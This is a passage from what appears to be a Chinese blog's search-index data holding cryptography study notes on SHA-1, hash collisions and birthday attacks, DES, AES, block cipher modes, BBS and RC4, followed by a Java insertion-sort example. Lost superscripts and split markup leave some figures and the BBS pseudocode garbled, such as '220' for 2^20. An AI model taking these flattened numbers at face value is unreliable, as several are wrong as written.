512)，即填充后的消息长度为512bit的某一倍数减64bit，留出的64bit备第(2)步使用。</p>\n<p>•填充方式是第1位为1，其后各位皆为0。</p>\n<p>•如果消息长度X=448bit，仍需填充512bit，使其长度变为960bit，因此填充位数是1~512比特。</p>\n<p>​       <strong>(2)</strong>  <strong>附加上消息的长度值</strong></p>\n<p>​       用步骤(1)留出的64比特以Big-endian方式来表示消息被填充前的长度值，即64比特存放的是消息长度X的二进制表示值。</p>\n<p>​       前两步执行完后，消息的长度为512的倍数（设为L），将消息划分为L个长度为512bit的块m0，m1，…，mL-1，每一块又可划分为16个32比特长的子块。</p>\n<p>​       <strong>(3)</strong>  <strong>缓冲区初始化</strong></p>\n<p>​       算法使用了160bit长的缓冲区以存储中间结果和最终的消息摘要，缓冲区可表示为5个32比特长的寄存器A、B、C、D、E。每个寄存器都以Big-endian方式存储数据，其初值（用十六进制表示）取为</p>\n<p>​             A=67452301           B=efcdab89</p>\n<p>​             C=98badcfe            D=10325476</p>\n<p>​             E=c3d2e1f0</p>\n<p>​       <strong>(4)</strong>  <strong>压缩函数处理</strong></p>\n<p>​       以块为单位对消息进行处理，每一消息块mj（j=0, …, L-1）都经一压缩函数HSHA处理。压缩函数有4轮处理过程，每一轮由20步迭代组成。</p>\n<p><img src=\"/images/mima3/1550734346217.png\" alt=\"1550734346217\"></p>\n<p>​       <strong>(5)</strong>  <strong>输出消息摘要</strong></p>\n<p>​       L个消息块mj（j=0,…,L-1）都被处理完后，最后一个分组的输出即为160比特的消息摘要。</p>\n<h3 id=\"MD5与SHA-1的比较\"><a href=\"#MD5与SHA-1的比较\" class=\"headerlink\" title=\"MD5与SHA-1的比较\"></a><strong>MD5与SHA-1的比较</strong></h3><p>​       两种算法相似点在于：</p>\n<ol>\n<li>结构类似：都是以MD4为基础设计的。</li>\n<li>算法描述起来都较为简单：实现起来也较为简单，均不需要较大的程序和代换表。</li>\n</ol>\n<p>​       两种算法不同点在于：</p>\n<ol>\n<li>抗攻击的强度：SHA-1抗穷举攻击的强度高于MD5抗穷举攻击的强度。</li>\n<li>速度和效率：在相同硬件上实现时，SHA-1的速度要比MD5的速度慢，MD5的执行效率比SHA-1高。</li>\n<li>数据的存储方式：MD5使用Little-endian方式，SHA-1使用Big-endian方式。</li>\n</ol>\n<h3 id=\"Hash函数的攻击\"><a href=\"#Hash函数的攻击\" class=\"headerlink\" title=\"Hash函数的攻击\"></a><strong>Hash函数的攻击</strong></h3><p>​      假设攻击者知道Hash算法，攻击者的主要目标：</p>\n<ul>\n<li>寻找具有给定消息摘要的一对或多对碰撞消息。</li>\n<li>寻找具有相同消息摘要的一对或多对碰撞消息。</li>\n</ul>\n<blockquote>\n<p>评价Hash函数的好坏最简单的方法是看攻击者找到一对碰撞消息所花的代价有多大。   </p>\n</blockquote>\n<p>​       <strong>1.</strong>  <strong>生日问题</strong></p>\n<p>​       生日攻击来自于概率论中的生日问题：在一个教室中至少要有k个学生才能够使得有两个学生生日相同的概率大于1/2，求k值至少多大？</p>\n<p>​       P(n, k)：n种取法，共取k次，发生碰撞的概率。则生日问题可记为P(365, k)≥1/2，则k为多少？</p>\n<ul>\n<li>k=23：P(365, 23)=0.5073</li>\n<li>k=100：P(365, 100)=0.9999997  </li>\n</ul>\n<p>​       <strong>2.</strong>  <strong>寻找具有相同输出摘要的碰撞消息</strong></p>\n<p>​       已知Hash函数有n个可能的输出摘要，特别地，如果输出摘要为m比特长，即可能的输出摘要个数n=2m，若Hash函数k个随机输入消息中至少有两个产生相同输出的概率大于1/2，求k值至少多大。</p>\n<p>​       生日攻击意味着要保证消息摘要对碰撞问题是安全的，消息摘要的长度应该有一个下界。</p>\n<ul>\n<li>例如，长度为40比特的消息摘要是非常不安全的，因为仅仅220个随机Hash函数值中就有1/2的概率发生一次碰撞。</li>\n<li>对于安全的消息摘要，现在实际使用的消息摘要一般为160比特或者更长。</li>\n</ul>\n","categories":[],"tags":["密码学"]},{"title":"密码学基础笔记(二)","url":"http://b1ng0.top/2019/02/21/密码学基础笔记(二)/","content":"<h2 id=\"第三章-分组密码和数据加密标准（DES）\"><a href=\"#第三章-分组密码和数据加密标准（DES）\" class=\"headerlink\" title=\"第三章 分组密码和数据加密标准（DES）\"></a>第三章 分组密码和数据加密标准（DES）</h2><h3 id=\"流密码与分组密码\"><a href=\"#流密码与分组密码\" class=\"headerlink\" title=\"流密码与分组密码\"></a>流密码与分组密码</h3><p><img src=\"/images/mima2/2-1.jpg\" alt></p>\n<p>分组密码：</p>\n<blockquote>\n<p>所谓分组密码是将明文分成一组一组，在密钥的控制下，经过加密变换生成一组一组的密文。</p>\n<p>​       Step 1：将明文消息序列m1, m2, …, mi, …划分成等长的消息组（m1, …, mn），（mn+1, …, m2n），…</p>\n<p>​       Step 2：在密钥k=k1, k2, …, kn的控制下按固定的加密算法一组一组进行加密。</p>\n<p>​       Step 3：最后输出一组一组密文（c1, c2, …, cl），（cl+1, cl+2, …, c2l）。</p>\n<p>在相同密钥下，分组密码对每组明文所进行的变换是一样的，因此只需要研究对单独一组明文进行加密变换。</p>\n</blockquote>\n<h3 id=\"Feistel密码\"><a href=\"#Feistel密码\" class=\"headerlink\" title=\"Feistel密码\"></a>Feistel密码</h3><p>Feistel建议使用乘积密码的概念来逼近理想分组密码。乘积密码是指依次使用两个或两个以上基本密码，所得结果的密码强度将强于所有单个密码的强度。</p>\n<p><code>C=Enckn(...Enck2(Enck1(m))…)</code></p>\n<p>Feistel密码：</p>\n<ul>\n<li><p>代替：每个明文元素或元素组被唯一地替换为相应的密文元素或元素组。</p>\n</li>\n<li><p>置换：明文元素的序列被替换为该序列的一个置换。也就是说，序列里没有元素被添加，删除或替换，但序列里出现的顺序改变了。</p>\n</li>\n<li>扩散：将明文的统计特性散布到密文中去，这可以通过让每个明文数字尽可能地影响多个密文数字。</li>\n<li><p>混淆：使密文和密钥之间的统计关系尽可能复杂，以使敌手无法得到密钥。</p>\n</li>\n<li><p>分组长度: 分组越大则安全性越高，但加密速度就越慢。设计中最为普遍使用的是64比特。</p>\n</li>\n<li><p>密钥长度：密钥越长则安全性越高，但加密速度就越慢。现在普遍认为64比特或更短的密钥长度是不安全的，通常使用128比特的密钥长度。</p>\n</li>\n<li>迭代轮数：单轮结构远不足以保证安全性，但多轮结构可提供足够的安全性。典型地，轮数取为16。</li>\n<li>子密钥产生算法：该算法的复杂性越大，则密码分析的困难性就越大。</li>\n<li>轮函数F：轮函数的复杂性越大，密码分析的困难性也越大。</li>\n<li>快速软件加/解密：许多情况下，算法是被镶嵌在应用程序中，因而无法用硬件实现。此时算法的执行速度是考虑的关键。</li>\n<li>简化分析难度：如果算法能被无疑义地解释清楚，就可容易地分析算法抵抗攻击的能力，有助于设计高强度的算法。</li>\n</ul>\n<h3 id=\"数据加密标准（DES）\"><a href=\"#数据加密标准（DES）\" class=\"headerlink\" title=\"数据加密标准（DES）\"></a>数据加密标准（DES）</h3><p>在2001年高级加密标准（AES）提出前，DES一直是使用最广泛的加密方案。</p>\n<ul>\n<li><p>分组长度为64比特，密钥长度为56比特。</p>\n</li>\n<li><p>DES在1975年3月17日首次被公布在联邦记录中，经过大量的公开讨论后，DES于1977年1月15日被正式批准并作为美国联邦信息处理标准。</p>\n</li>\n<li><p>规定每隔5年由美国国家保密局作出评估，并重新批准它是否继续作为联邦加密标准。</p>\n</li>\n</ul>\n<p>DES加密算法概述：</p>\n<ul>\n<li>DES的结构是典型的Feistel密码结构。</li>\n<li>明文分组长度为64bit。</li>\n<li>密文分组长度为64bit。</li>\n<li>初始密钥长度为64bit。（其中，第8、16、24、32、40、48、56、64为奇偶校验位，因此，实际的密钥长为56bit。）</li>\n</ul>\n<p><img src=\"/images/mima2/2-2.jpg\" alt></p>\n<p>DES加密过程：</p>\n<ol>\n<li>初始置换IP：重排明文分组的64 bit数据。</li>\n<li>具有相同功能的16轮迭代：每轮中都有置换和代换运算，第16轮变换的输出分为左右两半，并交换次序。</li>\n<li>逆初始置换IP-1（IP的逆）：产生64 bit的密文。</li>\n</ol>\n<p>子密钥Ki的生成：</p>\n<ol>\n<li>初始密钥K为64 bit，首先置换选择PC1置换。</li>\n<li>将置换后的56 bit分为各28 bit的左、右两半，分别记为C0和D0。在第i轮分别对Ci-1和Di-1进行循环左移，移位后的结果作为求下一轮子密钥的输入，同时也作为置换选择PC2的输入。</li>\n<li>通过置换选择PC2产生的48 bit的Ki，即为i轮的子密钥，作为轮函数f (Ri-1, Ki)的输入。</li>\n</ol>\n<p>S盒代换：</p>\n<p>DES算法中除了S盒是非线性变换外，其余变换均为线性变换，S盒是经过精心设计和严格挑选的。</p>\n<p><strong>DES算法保密的关键在于S盒！</strong></p>\n<p>DES的解密过程：</p>\n<ul>\n<li>DES的加密算法具有可逆性，解密64 bit密文消息分组使用与加密相同的算法，所不同的是子密钥顺序使用相反，依次为 K16, K15, …, K1。</li>\n<li>当64 bit密文作为明文输入时，解密过程的第1轮迭代使用子密钥K16，第2轮迭代使用子密钥K15，…，第16轮迭代使用子密钥K1，结果输出得到64 bit明文。</li>\n</ul>\n<p>56位密钥的使用：</p>\n<p>在DES成为标准时，采用的密钥是56 bit，其密钥量仅为256约为1017个，难以抵抗穷举搜索攻击。</p>\n<p>问题主要集中在算法中的8个S盒上。DES密码体制的安全性依赖于非线性的S盒。S盒设计的详细准则一直没有公开，致使许多密码学家怀疑S盒设计中可能包含陷门。</p>\n<p>双重DES ：</p>\n<p>针对DES有效密钥长度偏短等安全性问题，人们利用实现DES的现有软硬件，寻求使用DES的多重加密方案以增加密码体制的强度。实用中一般广泛采用的有二重和三重DES等几种形式。</p>\n<h2 id=\"第四章-数学基础（略）\"><a href=\"#第四章-数学基础（略）\" class=\"headerlink\" title=\"第四章 数学基础（略）\"></a>第四章 数学基础（略）</h2><h2 id=\"第五章-AES\"><a href=\"#第五章-AES\" class=\"headerlink\" title=\"第五章 AES\"></a>第五章 AES</h2><p>AES应用实例：</p>\n<ul>\n<li>路由器</li>\n<li>安卓</li>\n<li>SIM卡</li>\n</ul>\n<h3 id=\"总体结构：\"><a href=\"#总体结构：\" class=\"headerlink\" title=\"总体结构：\"></a>总体结构：</h3><p>AES是一个迭代型分组密码：</p>\n<ul>\n<li>分组长度：可以独立地指定为128比特、192比特、256比特。</li>\n<li>密钥长度：可以独立地指定为128比特、192比特、256比特。</li>\n</ul>\n<p>状态、种子密钥和轮数：</p>\n<p>类似于明密文分组，算法的中间结果也分组，称中间结果的分组为状态，所有的操作都在状态上进行。</p>\n<ul>\n<li>状态可以用以字节为元素的矩阵表示，该矩阵有4行，列数记为Nb，Nb等于分组长度除以32。</li>\n<li>种子密钥也用一个以字节为元素的矩阵表示，该矩阵有4行，列数记为Nk，Nk等于分组长度除以32。</li>\n</ul>\n<p>迭代的轮数记为Nr，Nr与Nb和Nk有关，Nr与Nb和Nk的关系如下表：</p>\n<p><img src=\"/images/mima2/2-3.jpg\" alt></p>\n<h3 id=\"详细结构\"><a href=\"#详细结构\" class=\"headerlink\" title=\"详细结构\"></a>详细结构</h3><p>当Nk等于4时，整个算法由10轮组成。每轮由4个变换模块组成，分别是：</p>\n<ol>\n<li>字节代换（ByteSub）</li>\n<li>行移位（ShiftRow）</li>\n<li>列混合（MixColumn）</li>\n<li>轮密钥加（AddRoundKey）</li>\n</ol>\n<p>最后一轮略有不同，没有列混合。</p>\n<p><img src=\"/images/mima2/2-4.png\" alt></p>\n<p>加密过程：</p>\n<ol>\n<li>初始轮密钥加</li>\n<li>Nr-1轮迭代</li>\n<li>最后一轮变换</li>\n</ol>\n<h3 id=\"字节代替变换（ByteSub）\"><a href=\"#字节代替变换（ByteSub）\" class=\"headerlink\" title=\"字节代替变换（ByteSub）\"></a>字节代替变换（ByteSub）</h3><p>字节代换是非线形变换，独立地对状态的每个字节进行。代换表（即S-盒）是可逆的，由以下两个变换的合成得到：  </p>\n<ol>\n<li>首先，将字节看作GF(28)上的元素，映射到自己的乘法逆元，00映射到自己。</li>\n<li>其次，对字节做如下的（GF(2)上的，可逆的）仿射变换：</li>\n</ol>\n<p><img src=\"/images/mima2/2-5.png\" alt></p>\n<h3 id=\"行移位变换（ShiftRow）\"><a href=\"#行移位变换（ShiftRow）\" class=\"headerlink\" title=\"行移位变换（ShiftRow）\"></a>行移位变换（ShiftRow）</h3><p>状态矩阵State中的每一行将以字节为单位，循环左移不同的位移量。</p>\n<ul>\n<li>第一行：保持不变</li>\n<li>第二行：循环左移一个字节</li>\n<li>第三行：循环左移两个字节</li>\n<li>第四行：循环左移三个字节 </li>\n</ul>\n<h3 id=\"列混合变换（MixColumn）\"><a href=\"#列混合变换（MixColumn）\" class=\"headerlink\" title=\"列混合变换（MixColumn）\"></a>列混合变换（MixColumn）</h3><p>将State乘以一个固定的矩阵A。</p>\n<h3 id=\"轮密钥加变换（AddRoundKey）\"><a href=\"#轮密钥加变换（AddRoundKey）\" class=\"headerlink\" title=\"轮密钥加变换（AddRoundKey）\"></a>轮密钥加变换（AddRoundKey）</h3><p>密钥加是将轮密钥Ki简单地与状态State进行逐比特异或。</p>\n<h3 id=\"AES的密钥扩展\"><a href=\"#AES的密钥扩展\" class=\"headerlink\" title=\"AES的密钥扩展\"></a>AES的密钥扩展</h3><p>密钥扩展指从种子密钥得到轮密钥的过程，其基本原则如下： </p>\n<ul>\n<li>轮密钥的比特数等于分组长度乘以轮数加1：128 bit × (10+1) = 1408 bit</li>\n<li>种子密钥被扩展成为扩展密钥（<strong>密钥扩展</strong>）。</li>\n<li>轮密钥从扩展密钥中取，其中第1轮轮密钥取扩展密钥的前Nb个字，第2轮轮密钥取接下来的Nb个字，如此下去（<strong>轮密钥选取</strong>）。</li>\n</ul>\n<h3 id=\"密钥扩展算法\"><a href=\"#密钥扩展算法\" class=\"headerlink\" title=\"密钥扩展算法\"></a>密钥扩展算法</h3><p>将种子密钥扩展为扩展密钥的计算过程如下：</p>\n<p><img src=\"/images/mima2/2-6.png\" alt></p>\n<p>当种子密钥长度为128bit时，Nk＝4：</p>\n<p><code>temp = SubByte(RotByte(W[i-1])) Å Rcon[i/Nk]</code> </p>\n<ul>\n<li>RotByte( )：循环左移一个字节，如W=(a0, a1, a2, a3)，则RotByte(W)=(a1, a2, a3, a0)。</li>\n<li>SubByte( )：S盒的字节代换。</li>\n<li>Rcon[i]：轮常数</li>\n</ul>\n<p><img src=\"/images/mima2/2-7.png\" alt></p>\n<h3 id=\"AES的解密过程\"><a href=\"#AES的解密过程\" class=\"headerlink\" title=\"AES的解密过程\"></a>AES的解密过程</h3><p><strong>AES加密算法的每一步都可逆！</strong></p>\n<h2 id=\"第6章-分组密码的工作模式\"><a href=\"#第6章-分组密码的工作模式\" class=\"headerlink\" title=\"第6章  分组密码的工作模式\"></a>第6章  分组密码的工作模式</h2><p>分组密码的工作模式：</p>\n<blockquote>\n<p>为了能在各种应用场合使用DES，1980年，美国在FIPSPUS 81中标准化了DES算法的四种工作模式，后来对AES算法研发过程中，增加了新的工作模式，这些模式适用于任何分组密码算法。</p>\n</blockquote>\n<p>五种常用的工作模式为:</p>\n<p>1.电码本（Electronics Code Book，ECB）</p>\n<p>2.密文分组链接（Cipher Block Chaining，CBC）</p>\n<p>3.密文反馈（Cipher-FeedBack，CFB）</p>\n<p>4.输出反馈（Output-FeedBack，OFB）</p>\n<p>5.计数器（Counter，CTR）</p>\n<p>为了方便描述，定义如下符号：</p>\n<ul>\n<li>Ek：分组密码加密算法</li>\n<li>M1, M2, …, Mn：明文消息中n个连续的分组</li>\n<li>C1,  C2,  …,  Cn：密文消息中n个连续的分组</li>\n<li>IV：初始向量，是一个随机比特串</li>\n<li>HSj(A)：A的j个最高有效位，例如HS8(0010101110100101)=00101011</li>\n<li>LSj(A)：A中除了j个最高位外剩下的有效位，例如LS8(0010101110100101)=10100101</li>\n<li>A||B：消息分组A和B的链接</li>\n</ul>\n<h3 id=\"电码本模式\"><a href=\"#电码本模式\" class=\"headerlink\" title=\"电码本模式\"></a>电码本模式</h3><p>电码本模式是分组密码的一个直接应用：它一次对一个明文分组Mi直接加密，每次的加密密钥k都相同。</p>\n<p>当密钥k取定时，对明文的每一个分组Mi，都有一个惟一的密文分组Ci与之对应。ECB模式的加密过程为：</p>\n<p><code>Ci=Ek(Mi)，i=1，2，…，n</code></p>\n<ul>\n<li><p>ECB模式的优点：当改变一个明文分组值的时候，仅仅会引起相应的密文分组取值发生变化，而其他密文分组不受影响。</p>\n</li>\n<li><p>ECB模式的缺点：相同的明文分组会产生相同的密文分组，易暴露明文的固有格式。因此ECB不适用于长消息，建议在大多数情况下不要使用ECB模式进行加密操作。</p>\n</li>\n</ul>\n<h3 id=\"密文分组链接模式\"><a href=\"#密文分组链接模式\" class=\"headerlink\" title=\"密文分组链接模式\"></a>密文分组链接模式</h3><p>密码分组链接模式是用于普通数据加密的一种分组密码工作模式。CBC解决了ECB的安全缺陷，可以让重复的明文分组产生不同的密文分组。</p>\n<p><code>C0=IV,</code><br><code>Ci=Ek(MiÅCi-1)，</code></p>\n<p><code>i=1,2, …, n</code></p>\n<ul>\n<li><p>CBC模式的优点：CBC模式输出的是随机化的密文分组，CBC模式适用于较长的明文消息进行加密。</p>\n</li>\n<li><p>CBC模式的缺点：当信道噪音等干扰带来密文传输错误时，密文中一位的错误将影响当前分组及下一分组的解密。</p>\n</li>\n</ul>\n<h3 id=\"密文反馈模式\"><a href=\"#密文反馈模式\" class=\"headerlink\" title=\"密文反馈模式\"></a>密文反馈模式</h3><p>设传送的每个单元（如一个字符）是j比特长，通常取j=8。以IV作为初始的b比特随机输入分组，存放于移位寄存器中。</p>\n<p><code>I1= IV                            Ii=LSj(Ii-1)||Ci-1     (i=2,3,…,n)</code></p>\n<p><code>O1=Ek(I1)                    Oi=Ek(Ii)          (i=2,3,…,n)</code></p>\n<p><code>C1=M1ÅHSj(O1)         Ci=MiÅHSj(Oi)  (i=2,3,…,n)</code></p>\n<ul>\n<li><p>CFB模式的优点：随机化密文。</p>\n</li>\n<li><p>CFB模式的缺点：当信道噪音等干扰带来密文传输错误时，密文中一位的错误将影响当前分组及下一分组的解密。</p>\n</li>\n</ul>\n<h3 id=\"输出反馈模式\"><a href=\"#输出反馈模式\" class=\"headerlink\" title=\"输出反馈模式\"></a>输出反馈模式</h3><p>输出反馈模式在结构上类似于CFB模式，两种模式的不同之处在于：</p>\n<ul>\n<li><p>OFB：将加密算法的输出反馈到移位寄存器</p>\n</li>\n<li><p>CFB：将密文单元反馈到移位寄存器</p>\n</li>\n</ul>\n<h3 id=\"计数器模式\"><a href=\"#计数器模式\" class=\"headerlink\" title=\"计数器模式\"></a>计数器模式</h3><p>计数器模式要求计数器的长度与分组长度相同，它将计数器从初始值开始计数所得到的值作为分组加密算法的输入，经过加密算法变换后的结果与明文分组异或，得到密文分组。</p>\n<p><code>Ci=MiÅE(Ctri)，i=1,2, …, n</code></p>\n<ul>\n<li>CRT模式的优点：<ul>\n<li>可以处理任意长度的数据，而且加密-解密过程仅涉及加密运算，不涉及解密运算，因此不用实现解密算法。</li>\n<li>能并行处理，即能同时对多个分组的加密-解密进行处理，而不必等到前面分组处理完才开始，而且可以提前进行预处理，这也可以极大地提高处理效率。</li>\n<li>可以随机地对任意一个密文分组进行解密，对该密文分组的处理与其他密文无关。</li>\n</ul>\n</li>\n</ul>\n<p><img src=\"/images/mima2/2-8.jpg\" alt></p>\n<h2 id=\"第七章-伪随机数的产生和流密码\"><a href=\"#第七章-伪随机数的产生和流密码\" class=\"headerlink\" title=\"第七章 伪随机数的产生和流密码\"></a>第七章 伪随机数的产生和流密码</h2><h3 id=\"随机数的使用\"><a href=\"#随机数的使用\" class=\"headerlink\" title=\"随机数的使用\"></a>随机数的使用</h3><p>大量密码算法或网络安全协议都需要随机数，如：</p>\n<ul>\n<li>密钥分发和认证</li>\n<li>会话密钥的产生</li>\n<li>RSA等公钥密码算法</li>\n<li>对称密码的密钥 </li>\n</ul>\n<p>现实中的随机数：</p>\n<ul>\n<li>手机动态验证码</li>\n<li>动态验证码</li>\n<li>密码器</li>\n</ul>\n<h3 id=\"随机数的使用-1\"><a href=\"#随机数的使用-1\" class=\"headerlink\" title=\"随机数的使用\"></a>随机数的使用</h3><p>这些应用对随机数序列产生提出了两个不同的要求：随机性和不可预测性。 </p>\n<ul>\n<li>随机性<ul>\n<li>分布均匀性：能通过均匀性检验、独立性检验、游程检验等基本的统计特性检验。</li>\n<li>独立性：序列中任何子序列不能由其他子序列推导出。</li>\n</ul>\n</li>\n<li>不可预测性<ul>\n<li>指即使给出产生序列的硬件和所有以前产生的序列的全部知识，也不可能预测下一个随机位是什么。因此，随机序列是非周期的。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"伪随机数发生器\"><a href=\"#伪随机数发生器\" class=\"headerlink\" title=\"伪随机数发生器\"></a>伪随机数发生器</h3><ul>\n<li>物理方法：利用自然界的一些真的随机物理量，如放射性衰变、宇宙射线的触发时间等。</li>\n<li>计算机产生（数学方法）：由一个初始状态（称为“种子”）开始，通过一个确定的算法来生成。一旦给定算法和种子值，输出序列就是确定的了，因此有一定的周期性，规律性和重复性，不是真正的随机数，通常称之为伪随机数。产生伪随机数的算法或硬件一般称为伪随机数发生器。</li>\n</ul>\n<h3 id=\"BBS发生器\"><a href=\"#BBS发生器\" class=\"headerlink\" title=\"BBS发生器\"></a>BBS发生器</h3><p>BBS（Blum-Blum-Shub）产生器是可证明安全的伪随机比特序列产生器。</p>\n<p>首先选择两个大素数p和q，满足</p>\n<p><code>p ≡ q ≡ 3 (mod 4)</code></p>\n<p>令n = pq。再选一随机数s，使得s与n互素。</p>\n<p>BBS产生器产生伪随机序列的算法如下：</p>\n<p>​                       <code>X0 = s2 mod n</code></p>\n<p>​                       for i = 1 to ∞ do {</p>\n<p>​              Xi = X2i-1 mod n;</p>\n<p>​              R</p>\n<p><code>i</code></p>\n<p> = X</p>\n<p><code>i</code></p>\n<p> <code>mod 2 }</code></p>\n<h3 id=\"流密码\"><a href=\"#流密码\" class=\"headerlink\" title=\"流密码\"></a>流密码</h3><p>流密码结构图：</p>\n<p><img src=\"/images/mima2/2-9.png\" alt></p>\n<h3 id=\"RC4算法\"><a href=\"#RC4算法\" class=\"headerlink\" title=\"RC4算法\"></a>RC4算法</h3><p>RC4是MIT的Rivest开发的，是使用最为广泛的流密码算法之一。</p>\n<ul>\n<li>RC4的大小由参数n确定。对于一个n位长的字（或0, 1 序列），有2n种不同的排列方式，对应2n个不同的元素（或状态），这些元素组成一个长为2n的数组S。</li>\n<li>RC4每次随机选取数组S中的一个元素输出作为密钥k。</li>\n</ul>\n<p>RC4包含了两个算法：</p>\n<p>1.密钥调度算法（Key Scheduling Algorithm, KSA）：设置数组S的初始排序。</p>\n<p>2.伪随机生成算法（Pseud Random Generation Algorithm, PRGA）：随机选取元素作为密钥k输出并修改数组S的原始排序，每产生一个密钥k，数组S就被重新排列一次。</p>\n<p>KSA算法：</p>\n<ul>\n<li>常用的RC4的n=8，此时，RC4可以生成28=256个元素的数组S。KSA初始化S，取</li>\n</ul>\n<p>S[i]=i (i=0, 1, …, 255) </p>\n<ul>\n<li><p>选择0到255之间的一个子序列作为密钥，填充到密钥数组K[i]=i(i=0, 1, …, 255)中。填充时，这个密钥不断地重复直到填满整个密钥数组。</p>\n</li>\n<li><p>然后利用以下算法实现数组S的初始随机化排列。</p>\n</li>\n</ul>\n<p>​       <code>j=0;</code></p>\n<p>​      for i=0 to 255 do</p>\n<p>​       j=j+S[i]+K[i] (mod 256);</p>\n<p>​      <code>swap (S[i], S[j]);</code></p>\n<p>PRGA算法：</p>\n<p>在KSA将数组S进行初始排序的基础上，PRGA从数组S中随机选取元素作为密钥流字节，同时修改S的排序，以便于下一次密钥流的选取。</p>\n<p> 选取过程取决于索引i和j，这两个索引都从0开始，选取时重复执行以下算法，直到产生与明文的长度相等的密钥流。</p>\n<p>​                <code>i=i+1 (mod 256);</code></p>\n<p>​                j=j+S[i] (mod 256);</p>\n<p>​                swap (S[i], S[j]);</p>\n<p>​                t=S[i]+S[j] (mod 256);</p>\n<p>​                k=S[t];</p>\n<p>​                <code>output k=S[t];</code> </p>\n<p> 从算法中可以看出，索引i保证每个元素的改变，索引j保证元素改变的随机性。</p>\n<blockquote>\n<p>RC4的优点是在软件容易实现且运行速度快。RC4广泛用于商业密码产品中，如用于属于IEEE<br>802.11无线LAN标准的WEP协议和更新的WiFi保护访问协议等。目前所用的初始密钥一般至少为128<br>位。</p>\n<p>关于分析RC4的攻击方法有许多公开发表的文献。但是当密钥长度很大时，比如128位，没有那种攻击方法有效。</p>\n</blockquote>\n","categories":[],"tags":["密码学"]},{"title":"排序算法总结","url":"http://b1ng0.top/2019/02/07/排序算法总结/","content":"<h3 id=\"插入排序\"><a href=\"#插入排序\" class=\"headerlink\" title=\"插入排序\"></a>插入排序</h3><h4 id=\"直接插入\"><a href=\"#直接插入\" class=\"headerlink\" title=\"直接插入\"></a>直接插入</h4><p><img src=\"/images/sort/insertion_sort.gif\" alt=\"insertion_sort\"></p>\n<ul>\n<li><p>插入排序(稳定)</p>\n</li>\n<li><p>时间复杂度O(n^2)</p>\n</li>\n<li>空间复杂度O(1)</li>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">InsertionSort</span> </span>&#123; </span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">\t\t<span class=\"comment\">//给出无序数组</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">int</span> arr[] = &#123;<span class=\"number\">72</span>,<span class=\"number\">6</span>,<span class=\"number\">57</span>,<span class=\"number\">88</span>,<span class=\"number\">60</span>,<span class=\"number\">42</span>,<span class=\"number\">83</span>,<span class=\"number\">73</span>,<span class=\"number\">48</span>,<span class=\"number\">85</span>&#125;;</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出无序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t<span class=\"comment\">//插入排序</span></span><br><span class=\"line\">\t\tinsertionSort(arr);</span><br><span class=\"line\">\t\t<span class=\"comment\">//输出有序数组</span></span><br><span class=\"line\">\t\tSystem.out.println(Arrays.toString(arr));</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">insertionSort</span><span class=\"params\">(<span class=\"keyword\">int</span>[] arr)</span> </span>&#123;</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">1</span>; i&lt;arr.length; i++) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> j=i-<span class=\"number\">1</span>; j&gt;=<span class=\"number\">0</span>; j--) &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span>(arr[j+<span class=\"number\">1</span>]&lt;arr[j]) &#123;</span><br><span class=\"line\">\t\t\t\t\t<span class=\"keyword\">int</span> temp = arr[j+<span class=\"number\">1</span>];</span><br><span class=\"line\">\t\t\t\t\tarr[j+<span class=\"number\">1</span>] = arr[j];</span><br><span class=\"line\">\t\t\t\t\tarr[j] = temp;</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"希尔排序\"><a href=\"#希尔排序\" class=\"headerlink\" title=\"希尔排序\"></a>希尔排序</h4><ul>\n<li>希尔排序(不稳定)</li>\n<li>设置步长，分组插入排序</li>\n</ul>\n<p><img src=\"/images/sort/shellSort.png\" alt=\"shellSort\"></p>\n<ul>\n<li>代码实现：</li>\n</ul>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span 